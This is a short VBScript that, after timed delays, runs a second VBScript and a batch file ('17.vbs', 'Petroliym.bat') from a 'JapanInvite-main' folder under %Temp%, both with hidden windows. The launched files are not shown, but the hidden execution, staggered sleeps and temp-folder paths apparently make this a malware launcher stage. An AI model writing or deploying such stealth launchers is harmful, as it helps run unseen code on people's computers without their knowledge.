Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep 10500
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "%Temp%\JapanInvite-main\17.vbs" & Chr(34), 0
Set WshShell = Nothing
WScript.Sleep 15500
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "%Temp%\JapanInvite-main\Petroliym.bat" & Chr(34), 0
Set WshShell = Nothing




